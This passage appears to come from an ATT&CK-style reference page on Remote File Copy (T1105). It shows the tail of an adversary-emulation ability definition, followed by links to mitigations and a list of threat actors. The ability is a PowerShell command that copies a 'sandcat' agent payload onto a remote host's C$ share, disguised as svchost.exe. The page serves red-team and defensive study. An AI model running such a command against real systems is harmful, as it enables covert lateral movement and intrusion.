                                                                                                       '-Force;\n',
                                                                                            'command': '$path '
                                                                                                       '= '
                                                                                                       '"sandcat.go-windows";\n'
                                                                                                       '$drive '
                                                                                                       '= '
                                                                                                       '"\\\\#{remote.host.fqdn}\\C$";\n'
                                                                                                       'Copy-Item '
                                                                                                       '-v '
                                                                                                       '-Path '
                                                                                                       '$path '
                                                                                                       '-Destination '
                                                                                                       '$drive"\\Users\\Public\\svchost.exe";\n',
                                                                                            'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'edge': 'has_54ndc47_copy',
                                                                                                                                                               'source': 'remote.host.fqdn'}]},
                                                                                            'payloads': ['sandcat.go-windows']}}},
                                                          'requirements': [{'plugins.stockpile.app.requirements.not_exists': [{'edge': 'has_54ndc47_copy',
                                                                                                                               'source': 'remote.host.fqdn'}]},
                                                                           {'plugins.stockpile.app.requirements.basic': [{'edge': 'has_share',
                                                                                                                          'source': 'remote.host.fqdn'}]},
                                                                           {'plugins.stockpile.app.requirements.no_backwards_movement': [{'source': 'remote.host.fqdn'}]}],
                                                          'tactic': 'lateral-movement',
                                                          'technique': {'attack_id': 'T1105',
                                                                        'name': 'Remote '
                                                                                'File '
                                                                                'Copy'}}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations


* [Remote File Copy Mitigation](../mitigations/Remote-File-Copy-Mitigation.md)

* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)
    

# Actors


* [APT28](../actors/APT28.md)

* [Patchwork](../actors/Patchwork.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [APT3](../actors/APT3.md)
    
* [APT37](../actors/APT37.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Rancor](../actors/Rancor.md)
    
* [Turla](../actors/Turla.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [APT32](../actors/APT32.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [APT18](../actors/APT18.md)
    
* [menuPass](../actors/menuPass.md)
    
* [APT38](../actors/APT38.md)
    
* [Elderwood](../actors/Elderwood.md)
    
* [OilRig](../actors/OilRig.md)
    
* [APT33](../actors/APT33.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [TA505](../actors/TA505.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
* [APT-C-36](../actors/APT-C-36.md)
    
* [Silence](../actors/Silence.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
* [Molerats](../actors/Molerats.md)
    
* [Sharpshooter](../actors/Sharpshooter.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [APT39](../actors/APT39.md)
    
* [Rocke](../actors/Rocke.md)
    
* [Whitefly](../actors/Whitefly.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
